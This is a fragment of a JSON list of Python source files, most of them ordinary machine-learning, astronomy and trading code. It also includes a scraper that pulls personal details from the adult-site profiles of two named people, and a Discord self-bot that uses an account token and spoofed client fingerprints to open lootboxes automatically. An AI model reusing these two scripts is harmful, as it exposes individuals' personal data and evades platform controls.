print(\"high_limit : \", high_limit)\n    print(\"low_limit : \", low_limit)\n    corpus_embedding = model.encode(corpus[low_limit:high_limit], convert_to_tensor=True)\n    query_embedding = model.encode(query, convert_to_tensor=True)\n\n    cos_scores = util.cos_sim(query_embedding, corpus_embedding)[0]\n    top_score, top_idx = torch.topk(cos_scores, k=top_k)\n\n    # If score is less than LIMIT_SCORE, ignore the training data\n    # if round(top_score.item(), 3) < limit_score:\n    #     continue\n\n    result = {\n        \"query\": query,\n        \"score\": round(top_score.item(), 3),\n        \"document\": corpus[top_idx.item()]\n    }\n    print(result)\n    print(\"\\n\\n\")\n    results.append(result)\n\nprint(\"Export to files ...\")\nprint(\"Result count : \")\nprint(len(results))\n\nwith open(result_file_path, 'w', encoding=\"utf-8\") as file:\n    json.dump(results, file, ensure_ascii=False, indent=4)\n",
    "# ruff: noqa: RUF012\n\nimport unittest\n\nimport jupyter_kernel_test as jkt\n\n\nclass IPyKernelTests(jkt.KernelTests):\n    # the kernel to be tested\n    # this is the normally the name of the directory containing the\n    # kernel.json file - you should be able to do\n    # `jupyter console --kernel KERNEL_NAME`\n    kernel_name = \"pixi_kernel\"\n\n    # Everything else is OPTIONAL\n\n    # the name of the language the kernel executes\n    # checked against language_info.name in kernel_info_reply\n    language_name = \"python\"\n\n    # the normal file extension (including the leading dot) for this language\n    # checked against language_info.file_extension in kernel_info_reply\n    file_extension = \".py\"\n\n    # code which should write the exact string `hello, world` to STDOUT\n    code_hello_world = \"print('hello, world')\"\n\n    # code which should cause (any) text to be written to STDERR\n    code_stderr = \"import sys; print('test', file=sys.stderr)\"\n\n    # samples for the autocompletion functionality\n    # for each dictionary, `text` is the input to try and complete, and\n    # `matches` the list of all complete matching strings which should be found\n    completion_samples = [\n        {\n            \"text\": \"zi\",\n            \"matches\": {\"zip\"},\n        },\n    ]\n\n    # samples for testing code-completeness (used by console only)\n    # these samples should respectively be unambiguously complete statements\n    # (which should be executed on <enter>), incomplete statements or code\n    # which should be identified as invalid\n    complete_code_samples = [\"1\", \"print('hello, world')\", \"def f(x):\\n  return x*2\\n\\n\\n\"]\n    incomplete_code_samples = [\"print('''hello\", \"def f(x):\\n  x*2\"]\n    invalid_code_samples = [\"import = 7q\"]\n\n    # code which should cause a help pager to be displayed (as of 4.1, this is\n    # displayed by the notebook only as inline text, so it's probably more\n    # useful for console clients)\n    code_page_something = \"zip?\"\n\n    # code which should generate a (user-level) error in the kernel, and send\n    # a traceback to the client\n    code_generate_error = \"raise\"\n\n    # a statement or block of code which generates a result (which is shown\n    # as Out[n] instead of just something printed to stdout)\n    # running each `code` should cause `result` to be displayed (note that the\n    # result here will always be a string representation of whatever the actual\n    # result type is - be careful of string formatting)\n    code_execute_result = [\n        {\"code\": \"1+2+3\", \"result\": \"6\"},\n        {\"code\": \"[n*n for n in range(1, 4)]\", \"result\": \"[1, 4, 9]\"},\n    ]\n\n    # code which generates some sort of rich output\n    # for each `code` input a single rich display object with the specified\n    # `mime` type should be sent to the frontend\n    # note that this expects a `display_data` message rather than\n    # `execute_result`; this test might be a little too inflexible in some cases\n    code_display_data = [\n        {\n            \"code\": \"from IPython.display import HTML, display; display(HTML('<b>test</b>'))\",\n            \"mime\": \"text/html\",\n        },\n        {\n            \"code\": \"from IPython.display import Math, display; display(Math('\\\\frac{1}{2}'))\",\n            \"mime\": \"text/latex\",\n        },\n    ]\n\n    # test the support for searching/recalling history (used by console only)\n    # the history tests reuse the code blocks in `code_execute_result` above,\n    # so will not run if no test code is available\n    # `code_history_pattern` is a glob-style pattern which should match at least\n    # one code sample in `code_execute_result`\n    # `supported_history_operations` is a list of the `hist_access_type` options\n    # which should be tested; possible values are \"tail\", \"range\" and \"search\"\n    code_history_pattern = \"1?2*\"\n    supported_history_operations = (\"tail\", \"search\")\n\n    # test the support for object inspection\n    # the sample should be a name about which the kernel can give some help\n    # information (a built-in function is probably a good choice)\n    # only the default inspection level (equivalent to ipython \"obj?\")\n    # is currently tested\n    code_inspect_sample = \"zip\"\n\n    # a code sample which should cause a `clear_output` message to be sent to\n    # the client\n    code_clear_output = \"from IPython.display import clear_output; clear_output()\"\n\n\nif __name__ == \"__main__\":\n    unittest.main()\n",
    "import math\n\ndef read_layer_settings(path):\n    print(f\"Reading FouriScale layer settings\")\n    layer_settings = []\n    with open(path, 'r') as f:\n        raw_lines = f.readlines()\n        for raw_line in raw_lines:\n            layer_settings.append(raw_line.rstrip('\\n'))\n    return layer_settings\n\n\ndef read_base_settings(path):\n    print(f\"Reading FouriScale base settings\")\n    base_settings = dict()\n    with open(path, 'r') as f:\n        raw_lines = f.readlines()\n        for raw_line in raw_lines:\n            aspect_ratio, dilate = raw_line.split(':')\n            base_settings[aspect_ratio] = [float(s) for s in dilate.split(',')]\n    return base_settings\n\n\ndef find_smallest_padding_pair(height, width, base_settings):\n    # Initialize the minimum padding size to a large number and the result pair\n    min_padding_size = float('inf')\n    result_pair = None\n    result_scale = None\n    \n    for aspect_ratio, size in base_settings.items():\n        base_height, base_width = size\n        scale_height = math.ceil(height / base_height)\n        scale_width = math.ceil(width / base_width)\n\n        if scale_height == scale_width:\n            padding_height = base_height * scale_height\n            padding_width = base_width * scale_width\n            padding_size = (padding_height - height) + (padding_width - width)\n            \n            if padding_size < min_padding_size and padding_height >= height and padding_width >= width:\n                min_padding_size = padding_size\n                result_pair = (base_height, base_width)\n                result_scale = aspect_ratio\n                \n    return result_pair, result_scale",
    "import requests\nfrom bs4 import BeautifulSoup\n\ndef scrape_onlyfans_account(url):\n    response = requests.get(url)\n    if response.status_code != 200:\n        print(\"Failed to retrieve the profile page. Please check the URL and try again.\")\n        return\n\n    soup = BeautifulSoup(response.content, 'html.parser')\n\n    name_element = soup.select_one('h1.p-name')\n    name = name_element.text.strip() if name_element else \"N/A\"\n    images_element = soup.select_one('div.p-media-block[data-type=\"images\"] span')\n    images_count = images_element.text.strip() if images_element else \"N/A\"\n    videos_element = soup.select_one('div.p-media-block[data-type=\"videos\"] span')\n    videos_count = videos_element.text.strip() if videos_element else \"N/A\"\n    likes_element = soup.select_one('div.p-stats-block[data-type=\"likes\"] span')\n    likes_count = likes_element.text.strip() if likes_element else \"N/A\"\n    followers_element = soup.select_one('div.p-stats-block[data-type=\"followers\"] span')\n    followers_count = followers_element.text.strip() if followers_element else \"N/A\"\n\n    print(\"OnlyFans Account Details:\")\n    print(\"Name:\", name)\n    print(\"Images Posted:\", images_count)\n    print(\"Videos Posted:\", videos_count)\n    print(\"Likes:\", likes_count)\n    print(\"Followers:\", followers_count)\n    print(\"\\n\")\n\ndef scrape_pornhub_account(url):\n    response = requests.get(url)\n    if response.status_code != 200:\n        print(\"Failed to retrieve the profile page. Please check the URL and try again.\")\n        return\n\n    soup = BeautifulSoup(response.content, 'html.parser')\n\n    name_element = soup.select_one('div.usernameWrap')\n    name = name_element.text.strip() if name_element else \"N/A\"\n    location_element = soup.select_one('div.userDetails dd.location')\n    location = location_element.text.strip() if location_element else \"N/A\"\n    views_element = soup.select_one('div.userDetails dd.views')\n    views_count = views_element.text.strip() if views_element else \"N/A\"\n    career_element = soup.select_one('div.userDetails dd.careerStatus')\n    career_status = career_element.text.strip() if career_element else \"N/A\"\n    gender_element = soup.select_one('div.userDetails dd.gender')\n    gender = gender_element.text.strip() if gender_element else \"N/A\"\n    birth_element = soup.select_one('div.userDetails dd.birthplace')\n    birth_place = birth_element.text.strip() if birth_element else \"N/A\"\n\n    print(\"Pornhub Account Details:\")\n    print(\"Name:\", name)\n    print(\"City and Country:\", location)\n    print(\"Profile Views:\", views_count)\n    print(\"Career Status:\", career_status)\n    print(\"Gender:\", gender)\n    print(\"Birth Place:\", birth_place)\n    print(\"\\n\")\n\ndef main():\n    onlyfans_url = \"https://onlyfans.com/abbykbaee\"\n    pornhub_url = \"https://www.pornhub.com/model/realtelarilove\"\n\n    scrape_onlyfans_account(onlyfans_url)\n    scrape_pornhub_account(pornhub_url)\n\nif __name__ == \"__main__\":\n    main()",
    "from skyfield import almanac\nfrom skyfield.api import load, wgs84\nfrom typing import Tuple\n\nimport argparse\nimport isodate\nimport re\nimport os\nimport os.path\n\nfrom datetime import datetime, date, timezone\nfrom pathlib import Path\nfrom geopy.geocoders import Nominatim\n\nimport subprocess\nimport time\nimport tempfile\nimport shutil\n\nversion = \"2.0.1\"\n\n\nclass Parameters:\n    def __init__(self, args: argparse.Namespace) -> None:\n        lonlat: list = args.loc[0]\n        city: str = args.loc[1]\n        view: list[float] = args.view\n\n        self.__az: float = view[0]\n        self.__alt: float = view[1]\n        self.__fov: float = view[2]\n        self.__lon: float = lonlat[0]\n        self.__lat: float = lonlat[1]\n        self.__city: str = city\n        self.__planet: str = args.planet\n        self.__caption: str = args.caption\n        self.__outfile: str = args.outfile\n        self.__timespan: float = args.timespan\n        self.__delta_t: float = args.dt\n        self.__fps: float = args.fps\n        self.__show_video: bool = args.show_video\n        self.__template: str = args.template\n        self.__start_date: datetime = self.__determine_start_time(args.date)\n        self.__video_size = args.video_size\n\n        self.__window_size: Tuple[int, int] | None\n        if args.window_size is None:\n            self.__window_size = None\n        else:\n            if 'x' not in args.window_size:\n                raise ValueError('The window size must be of the form \"1920x1080\"')\n\n            width_str, height_str = args.window_size.split('x')\n            self.__window_size = (int(width_str), int(height_str))\n\n    def __determine_start_time(self, date: datetime) -> datetime:\n        if date.hour == 0 and date.minute == 0 and date.second == 0 and self.planet == 'Earth':\n            self.__start_at_sunset = True\n\n            latlon = wgs84.latlon(self.lat, self.lon)\n            ts = load.timescale()\n            eph = load('de421.bsp')\n            observer = eph['Earth'] + latlon\n\n            t = ts.utc(date.year, date.month, date.day)\n            t0, t1 = t, ts.utc(t.utc[0], t.utc[1], t.utc[2], 24)\n            t_set, y_set = almanac.find_settings(observer, eph['Sun'], t0, t1)\n\n            if y_set[0] == False:\n                raise ValueError(\n                    f'You must specify a specific time because the location {self.lon},{self.lat} is experiencing either polar day or polar night! The script cannot compute a sunset time for this date: {date.isoformat()}.')\n\n            return t_set[0].utc_datetime()\n        else:\n            self.__start_at_sunset = False\n            return date\n\n    @property\n    def alt(self) -> float:\n        return self.__alt\n\n    @property\n    def az(self) -> float:\n        return self.__az\n\n    @property\n    def fov(self) -> float:\n        return self.__fov\n\n    @property\n    def lon(self) -> float:\n        return self.__lon\n\n    @property\n    def lat(self) -> float:\n        return self.__lat\n\n    @property\n    def city(self) -> str:\n        return self.__city\n\n    @property\n    def planet(self) -> str:\n        return self.__planet\n\n    @property\n    def start_date(self) -> datetime:\n        return self.__start_date\n\n    @property\n    def caption(self) -> str:\n        return self.__caption\n\n    @property\n    def outfile(self) -> str:\n        return self.__outfile\n\n    @property\n    def timespan(self) -> float:\n        return self.__timespan\n\n    @property\n    def delta_t(self) -> float:\n        return self.__delta_t\n\n    @property\n    def fps(self) -> float:\n        return self.__fps\n\n    @property\n    def show_video(self) -> bool:\n        return self.__show_video\n\n    @property\n    def start_at_sunset(self) -> bool:\n        return self.__start_at_sunset\n\n    @property\n    def template(self) -> str:\n        return self.__template\n\n    @property\n    def template_file(self) -> Path:\n        tempate_folder: Path = Path(os.path.dirname(os.path.realpath(__file__)))\n        return tempate_folder / 'script' / self.__template\n\n    @property\n    def video_size(self) -> str:\n        return self.__video_size\n\n    @property\n    def window_size(self) -> Tuple[int, int] | None:\n        return self.__window_size\n\n\nclass StellariumToVideo:\n    def __init__(self, param: Parameters) -> None:\n        tempPath: Path = Path(tempfile.gettempdir()) / 'kalstar_frames'\n        self.__frame_folder = tempPath\n        self.__final_file = self.__frame_folder / 'final.png'\n        self.__first_file = self.__frame_folder / 'first.png'\n        self.__param = param\n\n        # Create frame folder if it not already exists\n        if os.path.exists(str(self.__frame_folder)):\n            shutil.rmtree(str(self.__frame_folder))\n\n        os.mkdir(str(self.__frame_folder))\n\n    def create_script(self, script_path: Path) -> None:\n        with open(self.__param.template_file, 'r') as file:\n            script = file.read()\n\n        if os.name == 'nt':\n            script = script.replace(\"$FRAME_FOLDER$\", str(self.__frame_folder).replace(\"\\\\\", ",
    "\"\"\"\nThe Purpose of the PrivateBinance Arbitrage Bot (based on RoibalBot) Python Program is to create an automated trading bot (functionality) on Binance\nUtilized Python-Binance ( https://github.com/sammchardy/python-binance )\nAdvanced-Version capable of all exchanges, all coins (using cctx)\n\nThis 'bot' will run a functionality which seeks profitable triangular arbitrage opportunities on Binance\nWeekly/Daily/Hourly reports created on profit/loss\n\nInstructional Youtube Video: https://www.youtube.com/watch?v=8AAN03M8QhA - Additional Videos Available on youtube\n\nCreated 4/14/2018 by Joaquin Roibal\nV 0.01 - Updated 4/20/2018\nv 0.02 - Updated 5/30/2018 - Converted to Advanced Version: https://github.com/Roibal/Cryptocurrency-Trading-Bots-Python-Beginner-Advance\nv 0.03 - Created 6/18/2018 - Binance Arbitrage Bot\nv 0.04 - 6/21/2018 - Changed Name to CryptoTriangularArbitrageBinanceBot.py\nv 1.00 - 6/24/2018 - Converted to Private_TriArbBot.py for Private Trader Group\n\nAll Rights Reserved\n\nATTENION: BY RUNNING SCRIPT YOU AGREE TO REMIT 1% of PROFITS TO THE FOLLOWING ADDRESS:\nBTC: 1BYrAED4pi5DMKu2qZPv8pwe6rEeuxoCiD\n\nNOTE: All Subsequent Version of Program must contain this message, unmodified, in it's entirety\nCopyright (c) 2018 by Joaquin Roibal\n\"\"\"\n\nfrom binance.client import Client\nfrom binance.enums import *\nimport time\nfrom datetime import datetime\nimport matplotlib\nfrom matplotlib import cm\nimport matplotlib.pyplot as plt\nfrom binance.enums import *\nimport pprint\n#import save_historical_data_Roibal\nfrom BinanceKeys import BinanceKey1\n\n\"\"\"\napi_key = BinanceKey1['api_key']\napi_secret = BinanceKey1['api_secret']\n\nclient = Client(api_key, api_secret)\n\"\"\"\n\n#Found Code To Remove 1000ms error - https://github.com/sammchardy/python-binance/issues/249\nclass Binance:\n    def __init__(self, public_key = '', secret_key = '', sync = False):\n        self.time_offset = -3199\n        self.b = Client(public_key, secret_key)\n\n        if 1:\n            self.time_offset = self._get_time_offset()\n\n    def _get_time_offset(self):\n        res = self.b.get_server_time()\n        print(res['serverTime'] - int(time.time() * 1000))\n        return res['serverTime'] - int(time.time() * 1000)\n\n    def synced(self, fn_name, **args):\n        args['timestamp'] = int(time.time() - self.time_offset)\n        return getattr(self.b, fn_name)(**args)\n\nclient = Binance(public_key = BinanceKey1['api_key'], secret_key = BinanceKey1['api_secret'], sync=True)\nprint(client)\n#client.synced('order_market_buy', symbol='BNBBTC', quantity=10)\n\n\ndef run():\n    #Initialize Arbitrage Binance Bot\n    initialize_arb()\n    #Get Binance Wallet Balance - Split into 4 coins evenly\n\n    #Perform our Arbitrage Function\n\n    #Data Output (log) in a text file - keep track of start/end time, trades, balance\n    pass\n\ndef initialize_arb():\n\n    welcome_message = \"\\n\\n---------------------------------------------------------\\n\\n\"\n    welcome_message+= \"Hello and Welcome to the Binance Arbitrage Crypto Trader Bot Python Script\\nCreated 2018 by Joaquin Roibal (@BlockchainEng)\"\n    welcome_message+= \"A quick 'run-through' will be performed to introduce you to the functionality of this bot\\n\"\n    welcome_message+=\"To learn more visit medium.com/@BlockchainEng or watch introductory Youtube Videos\"\n    welcome_message+=\"\\nCopyright 2018 by Joaquin Roibal\\n\"\n    bot_start_time = str(datetime.now())\n    welcome_message+= \"\\nBot Start Time: {}\\n\\n\\n\".format(bot_start_time)\n    client.synced('get_account')        #Example of using Sync'd\n    print(welcome_message)\n    #info = client.synced.get_account()\n    #pprint(info)\n    balance = client.synced('get_asset_balance', asset='BTC')\n    pprint(balance)\n    data_log_to_file(balance)\n\n    #output to file - create function\n    data_log_to_file(welcome_message)\n    time.sleep(5)\n    try:\n        status = Client.synced('get_system_status()')\n        #print(\"\\nExchange Status: \", status)\n\n        #Account Withdrawal History Info\n        withdraws = Client.synced('get_withdraw_history()')\n        #print(\"\\nClient Withdraw History: \", withdraws)\n\n        #for symbol in list_of_symbols:\n            #market_depth(symbol)\n        #Collect all Symbols for Exchange\n        #Find Arbitrage Opportunities\n        coin_list = ['BTC', 'ETH', 'USDT', 'BNB']\n        list_of_symbols = ['ETHBTC', 'BNBETH', 'BNBBTC']\n        list_of_symbols2 = ['ETHUSDT', 'BNBETH', 'BNBUSDT']\n        list_of_symbols3 = ['BTCUSDT', 'BNBBTC', 'BNBUSDT']\n        list_of_arb_sym = [list_of_symbols, list_of_symbols2, list_of_symbols3]\n        #for sym in list_of_symbols:\n            #info = client.get_symbol_info(sym)\n            #print(info)\n        #prices = client.get_all_tickers()\n        tickers = client.get_orderbook_tickers()\n        #print(prices)\n        #print(tickers)\n        #portfolio = [10, 100, 10000, 500, str(datetime.now())] #Number of: [Bitcoin, Ethereum, USDT, Binance Coin]\n        #Load Binance Portfolio\n        binance_portfolio(coin_list)\n        #Load Portfoli",
    "import tls_client\nimport time\nimport datetime\nimport os, random\n\nred = '\\x1b[31m(-)\\x1b[0m'\nblue = '\\x1b[34m(+)\\x1b[0m'\ngreen = '\\x1b[32m(+)\\x1b[0m'\nyellow = '\\x1b[33m(!)\\x1b[0m'\n\ndef get_timestamp():\n    time_idk = datetime.datetime.now().strftime('%H:%M:%S')\n    timestamp = f'[\\x1b[90m{time_idk}\\x1b[0m]'\n    return timestamp\n\nclass DiscordSession:\n    def __init__(self, client_identifier=\"chrome112\"):\n        self.session = tls_client.Session(client_identifier=client_identifier, random_tls_extension_order=True)\n\n    def post(self, url, headers):\n        return self.session.post(url, headers=headers)\n\nclass LootBoxOpener:\n    lootbox_items = {\n        \"1214340999644446726\": \"Quack!!\",\n        \"1214340999644446724\": \"\u2b95\u2b06\u2b07\u2b95\u2b06\u2b07\",\n        \"1214340999644446722\": \"Wump Shell\",\n        \"1214340999644446720\": \"Buster Blade\",\n        \"1214340999644446725\": \"Power Helmet\",\n        \"1214340999644446723\": \"Speed Boost\",\n        \"1214340999644446721\": \"Cute Plushie\",\n        \"1214340999644446728\": \"Dream Hammer\",\n        \"1214340999644446727\": \"OHHHHH BANANA\"\n    }\n\n    def __init__(self, discord_session, token):\n        self.discord_session = discord_session\n        self.token = token\n        self.headers = {\n            'authority': 'discord.com',\n            'accept': '*/*',\n            'accept-language': 'en-US',\n            'authorization': token,\n            'origin': 'https://discord.com',\n            'referer': 'https://discord.com/channels/1222747973205758002/1224417703100551169',\n            'sec-ch-ua': '\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\"',\n            'sec-ch-ua-mobile': '?0',\n            'sec-ch-ua-platform': '\"Windows\"',\n            'sec-fetch-dest': 'empty',\n            'sec-fetch-mode': 'cors',\n            'sec-fetch-site': 'same-origin',\n            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9037 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36',\n            'x-debug-options': 'bugReporterEnabled',\n            'x-discord-locale': 'en-US',\n            'x-discord-timezone': 'Asia/Calcutta',\n            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDM3Iiwib3NfdmVyc2lvbiI6IjEwLjAuMjI2MzEiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMzcgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyODA3MDAsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjQ1MzY5LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',\n        }\n\n    def open_lootbox(self):\n        response = self.discord_session.post('https://discord.com/api/v9/users/@me/lootboxes/open', headers=self.headers)\n        if 'rate limited' in response.text:\n            print(f\"{get_timestamp()} {yellow} You Are Being Rate Limited!\")\n            time.sleep(2)\n        elif response.status_code == 200:\n            opened_item = response.json().get('opened_item')\n            if opened_item in self.lootbox_items:\n                print(f\"{get_timestamp()} {green} Successfully Opened A Lootbox : {self.lootbox_items[opened_item]}\")\n                time.sleep(random.uniform(7, 10))\n            else:\n                print(f\"{get_timestamp()} {red} An Unknown Item Was Received.\")\n        else:\n            print(f'{get_timestamp()} {red} An Error Occurred : {response.status_code} - {response.text}')\n\ndef main():\n    token = input(f\"{get_timestamp()} {blue} Please Enter Your Account Token : \")\n    discord_session = DiscordSession()\n    lootbox_opener = LootBoxOpener(discord_session, token)\n    \n    while True:\n        lootbox_opener.open_lootbox()\n        time.sleep(1)\n\nif __name__ == \"__main__\":\n    os.system(\"cls\")\n    main()\n",
    "import numpy as np\nimport sklearn.decomposition\nimport scipy.ndimage\nimport scipy.interpolate\nimport matplotlib.pyplot as plt\n\nloading1colour = \"#2171b5ff\"\nscore1colour = \"#ef3b2cff\"\n\n# All of this is copied and pasted from the covariance supplemental figure.\nN = 100000\nT = 30\nnp.random.seed(2)\nwhite = np.random.randn(T, N)\nlong_white = np.random.randn(T*3, N)\n_random_walk = np.cumsum(white, axis=0)\nrandom_walk = _random_walk - _random_walk[0]\n\n_ar1s = [np.random.randn(N)]\ncoef = .92\nfor i in range(0, T*3):\n    _ar1s.append(_ar1s[-1]*coef + np.random.randn(N))\n\nar1s = np.asarray(_ar1s)[T:(T*2)]\n\ntimeseries = [\n#(\"No autocorrelation\", white, [False,False]),\n(\"Low-pass filtered\\nwhite noise\", scipy.ndimage.gaussian_filter1d(long_white, axis=0, sigma=4)[T:(2*T)], [False,False]),\n(\"Wrap-around\", scipy.ndimage.gaussian_filter1d(white, axis=0, sigma=4, mode=\"wrap\"), ['<', '>']),\n(\"AR process\", ar1s, [False,False]),\n(\"MA process\", long_white[0:T]+long_white[1:(T+1)]*.75+long_white[2:(T+2)]*.5++long_white[3:(T+3)]*.25, [False,False]),\n(\"Random walk\\nstarting at 0\", random_walk, ['X', False]),\n(\"Random walk\\nmean-subtracted\", random_walk-np.mean(random_walk, axis=0, keepdims=True), [False,False]),\n(\"Random walk\\nstarting and ending at 0\",\n        random_walk - np.linspace(0, 1, random_walk.shape[0])[:,None]*(random_walk[-1]),\n        ['X', 'X']),\n]\n\n\n\n# This is all copied from Figure 5\n_tss_fmri = np.load(\"/home/max/Research_data/cortexlab/pca/camcan_timeseries.npy\")\ntss_fmri = _tss_fmri[np.random.RandomState(0).permutation(_tss_fmri.shape[0])]\ntss_generated = scipy.ndimage.gaussian_filter1d(np.random.randn(100000,300), axis=1, sigma=4)[:,140:200]\ntss_shadlen = np.load(\"_tss_demean_shadlen.npy\")\ntss_shadlen_sac = np.load(\"_tss_demean_shadlen_sac.npy\")\nrng = np.random.RandomState(0)\ndata = np.load(\"tsdata.npy\", allow_pickle=True)\ntsinterp = scipy.interpolate.interp1d(data[0], data[1])\nshifts_tss_monkey = rng.rand(2000)*.3\nshifts_cv_tss_monkey = rng.rand(2000)*.3\ntss_monkey = np.asarray([tsinterp(np.linspace(-.39, .29, 501)+shifts_tss_monkey[i]) for i in range(0, 2000)])\n\ntss_examples = [(\"Simulated smoothness\\nfrom Figure 2\", tss_fmri),\n                (\"Resting state fMRI\\nfrom Figure 2\",   tss_generated),\n                (\"Shifted timeseries\\nfrom Figure 3\",   tss_monkey),\n                (\"Random dot motion\\n(stimulus-aligned)\\nfrom Figure 4\",    tss_shadlen),\n                (\"Random dot motion\\n(choice-aligned)\\nfrom Figure 4\",    tss_shadlen_sac),\n                ]\n\ntexts = [e[0] for e in tss_examples] + [e[0]+\"\\nfrom Figure S2\" for e in timeseries]\nalltss = [e[1] for e in tss_examples] + [e[1].T for e in timeseries]\nallpcs = [sklearn.decomposition.PCA(n_components=3).fit(tss) for tss in alltss]\nallpcsrev = [sklearn.decomposition.PCA(n_components=3).fit_transform(tss.T) for tss in alltss]\n\nfrom cand import Point, Vector, Canvas\nc = Canvas(7, 6.2, \"in\")\nc.set_font(\"Nimbus Sans\", size=8, ticksize=7)\nplotnames_comps = [f\"comp{i}\" for i in range(0, len(allpcs))]\nc.add_grid(plotnames_comps, 2, Point(.2, 3.4, \"in\"), Point(6.75, 5.55, \"in\"), size=Vector(0.8, 0.8, \"in\"))\nplotnames_scores = [f\"scores{i}\" for i in range(0, len(allpcs))]\nc.add_grid(plotnames_scores, 2, Point(.2, 0.1, \"in\"), Point(6.75, 2.25, \"in\"), size=Vector(0.8, 0.8, \"in\"))\n\nfor i,(pcs,text) in enumerate(zip(allpcs,texts)):\n    ax = c.ax(plotnames_comps[i])\n    ax.plot(pcs.components_[0], pcs.components_[1], c=loading1colour, linewidth=2.5)\n    ax.set_title(text)\n    ax.axis(\"off\")\n\nfor i,(pcs,text) in enumerate(zip(allpcsrev,texts)):\n    ax = c.ax(plotnames_scores[i])\n    ax.scatter(pcs[:,0], pcs[:,1], c=score1colour, s=10)\n    ax.set_title(text)\n    ax.axis(\"off\")\n\nc.add_text(\"PC components - PC1 vs PC2\", Point(.1, 6.1, \"in\"), size=10, ha=\"left\", weight=\"bold\")\nc.add_text(\"PC scores (transposed matrix) - PC1 vs PC2\", Point(.1, 2.8, \"in\"), size=10, ha=\"left\", weight=\"bold\")\n    \nc.save(\"figuresup3.pdf\")\n",
    "import torch\nfrom torch import nn\n\nfrom .utils import unsqueeze_like\n\n\nclass MVSiLU(nn.Module):\n    def __init__(self, algebra, channels, invariant=\"mag2\", exclude_dual=False):\n        super().__init__()\n        self.algebra = algebra\n        self.channels = channels\n        self.exclude_dual = exclude_dual\n        self.invariant = invariant\n        self.a = nn.Parameter(torch.ones(1, channels, algebra.dim + 1))\n        self.b = nn.Parameter(torch.zeros(1, channels, algebra.dim + 1))\n\n        if invariant == \"norm\":\n            self._get_invariants = self._norms_except_scalar\n        elif invariant == \"mag2\":\n            self._get_invariants = self._mag2s_except_scalar\n        else:\n            raise ValueError(f\"Invariant {invariant} not recognized.\")\n\n    def _norms_except_scalar(self, input):\n        return self.algebra.norms(input, grades=self.algebra.grades[1:])\n\n    def _mag2s_except_scalar(self, input):\n        return self.algebra.qs(input, grades=self.algebra.grades[1:])\n\n    def forward(self, input):\n        norms = self._get_invariants(input)\n        norms = torch.cat([input[..., :1], *norms], dim=-1)\n        a = unsqueeze_like(self.a, norms, dim=2)\n        b = unsqueeze_like(self.b, norms, dim=2)\n        norms = a * norms + b\n        norms = norms.repeat_interleave(self.algebra.subspaces, dim=-1)\n        return torch.sigmoid(norms) * input\n",
    "import argparse\nimport torch\nimport einops\nimport random\nimport numpy as np\nimport gradio as gr\nimport open_clip\nfrom omegaconf import OmegaConf\nfrom transformers import AutoTokenizer\nfrom peft import get_peft_model, LoraConfig, TaskType\nfrom ranni.llama_modeling import LlamaForCausalLM\nfrom ranni.ddim_hacked import DDIMSampler\nfrom ldm.util import instantiate_from_config\nfrom utils import build_llama_prompt, chat, element_template, box_template, seq_to_element, seq_to_element_v2, seq_to_box, box_to_seq, draw_box\n\n\nparser = argparse.ArgumentParser()\nparser.add_argument(\"--config-path\", type=str, default='config/ranni_sdv21_v1.yaml')\nargs = parser.parse_args()\n\n\n# global values\nglobal layouts, edit_mask, intermediates\nedit_mask = None\nintermediates = None\nH, W = 768, 768\n\n\n### txt2panel\n# - base llama model\nllama_model_root = 'models/llama2_7b_chat'\nllama = LlamaForCausalLM.from_pretrained(llama_model_root).cuda()\nllama_tokenizer = AutoTokenizer.from_pretrained(llama_model_root)\nllama_tokenizer.pad_token_id = (0)\n\n# - lora\npeft_config = LoraConfig(\n    task_type=TaskType.CAUSAL_LM,\n    inference_mode=False,\n    r=64,\n    target_modules=[\"q_proj\", \"v_proj\"],\n    lora_alpha=16,\n    lora_dropout=0.05,\n    bias=\"none\",\n)\nllama = get_peft_model(llama, peft_config)\nllama = llama.eval().requires_grad_(False).cuda()\nlora_weight_ele = torch.load('models/llama2_7b_lora_element.pth', map_location='cpu')   # load an empty lora here\nlora_weight_box = torch.load('models/llama2_7b_lora_bbox.pth', map_location='cpu')\n\n\n### panel2img\nconfig = OmegaConf.load(args.config_path)\nmodel = instantiate_from_config(config.model).cuda()\nmodel.load_state_dict(torch.load('models/ranni_sdv21_v1.pth', map_location='cpu'), strict=False)    # TODO: delete clip loading in other place\nddim_sampler = DDIMSampler(model)\n\n\ndef seed_everything(seed=0):\n    seed = seed if seed >= 0 else random.randint(0, 2 ** 32 - 1)\n    np.random.seed(seed)\n    random.seed(seed)\n    torch.manual_seed(seed)\n    torch.cuda.manual_seed(seed)\n    torch.cuda.manual_seed_all(seed)\n\n\ndef pack_control(model, ins_masks, ins_texts, control_hint_dim=3):\n    ins_texts = torch.cat([model.cond_stage_model(texts, return_global=True).unsqueeze(0) for texts in ins_texts], dim=0)   \n    ins_masks = ins_masks.unsqueeze(2).repeat(1, 1, control_hint_dim, 1, 1) # B, N, C, H, W\n    return (ins_masks, ins_texts)\n\n\ndef stage1_process(prompt, seed=-1):\n\n    seed_everything(seed)\n    device = 'cuda:0'\n\n    # ------ element ----------\n    llama.load_state_dict(lora_weight_ele, strict=False)\n    ele_prompt = build_llama_prompt(\n        message=element_template['prompt_template'].format(prompt),\n        system_prompt=element_template['system_prompt_template']\n    )\n    ele_answer = chat(llama, llama_tokenizer, ele_prompt, device)\n\n    # 